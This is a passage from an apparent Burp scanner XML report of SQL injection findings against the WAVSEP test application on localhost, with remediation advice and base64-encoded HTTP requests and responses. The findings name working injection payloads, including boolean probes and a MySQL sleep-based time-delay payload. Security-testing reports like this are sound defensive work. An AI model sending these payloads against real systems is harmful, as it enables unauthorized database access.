XNlIG5lYXIgJycnIGF0IGxpbmUgMQoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTEwLUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1OdW1lcmljLUJpbmFyeURlbGliZXJhdGVSdW50aW1lRXJyb3ItV2l0aDIwMEVycm9ycy5qc3A/b3JkZXJieT0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSkgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjI2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MzANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEwIC0gSW5qZWN0aW9uIGludG8gYW4gb3JkZXIgYnkgY2xhdXNlIChudW1lcmljKSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEKPC9URD4KPFREPgpXZWxjb21lIHRvIHRoZSB3ZWIgc2l0ZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyCjwvVEQ+CjxURD4KUmVtZW1iZXIgdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CllvdXIgYWNjb3VudCBpcyBhYm91dCB0byBleHBpcmUKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5644439360408308736</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-With200Errors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>81733664 or 8741=08741</b> and <b>83384078 or 3304=3305</b> were each submitted in the transactionDate parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionDate parameter. The application took <b>20011</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTE1LUluamVjdGlvbkluU2VhcmNoLURhdGVXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcD90cmFuc2FjdGlvbkRhdGU9MjAxMC0wMi0wMjgxNzMzNjY0JTIwb3IlMjA4NzQxJTNkMDg3NDEgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU3OjQ0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAxMjYyDQoNCgoKCjwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgSFRNTCA0LjAxIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi9odG1sNC9sb29zZS5kdGQiPgo8aHRtbD4KPGhlYWQ+CjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PUlTTy04ODU5LTEiPgo8dGl0bGU+Q2FzZSAxNSAtIEluamVjdGlvbiBpbnRvIGRhdGUgdmFsdWVzICh3aXRob3V0IHF1b3RlcykgaW4gYW4gdXBkYXRlIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzMgo8L1REPgo8VEQ+CjEwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoxMzMKPC9URD4KPFREPgoxMjAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8VFI+CjxURD4KMTM1CjwvVEQ+CjxURD4KMzAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjIyMwo8L1REPgo8VEQ+CjQwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo0MjMKPC9URD4KPFREPgo1MDAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8VFI+CjxURD4KNDU2CjwvVEQ+CjxURD4KNjAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+Cjc4OQo8L1REPgo8VEQ+CjcwMTIKPC9URD4KPFREPgpFeHBlbnNpdmUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo4OTUKPC9URD4KPFREPgo4MDAwCjwvVEQ+CjxURD4KSGVsbG8gV29ybGQKPC9URD4KPFREPgoyMDEwLTAyLTAyCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTE1LUluamVjdGlvbkluU2VhcmNoLURhdGVXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcD90cmFuc2FjdGlvbkRhdGU9MjAxMC0wMi0wMjgzMzg0MDc4JTIwb3IlMjAzMzA0JTNkMzMwNSBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU3OjQ0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE1IC0gSW5qZWN0aW9uIGludG8gZGF0ZSB2YWx1ZXMgKHdpdGhvdXQgcXVvdGVzKSBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTE1LUluamVjdGlvbkluU2VhcmNoLURhdGVXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcD90cmFuc2FjdGlvbkRhdGU9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjQ0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE1IC0gSW5qZWN0aW9uIGludG8gZGF0ZSB2YWx1ZXMgKHdpdGhvdXQgcXVvdGVzKSBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7538222854729572352</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-With200Errors.jsp [transactionId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionId</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>95885714 or 3343=03343</b> and <b>32115551 or 3478=3479</b> were each submitted in the transactionId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionId parameter. The application took <b>20002</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTE2LUluamVjdGlvbkluVmlldy1OdW1lcmljV2l0aG91dFF1b3Rlcy1QZXJtaXNzaW9uQnlwYXNzLVdpdGgyMDBFcnJvcnMuanNwP3RyYW5zYWN0aW9uSWQ9MTMyOTU4ODU3MTQlMjBvciUyMDMzNDMlM2QwMzM0MyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
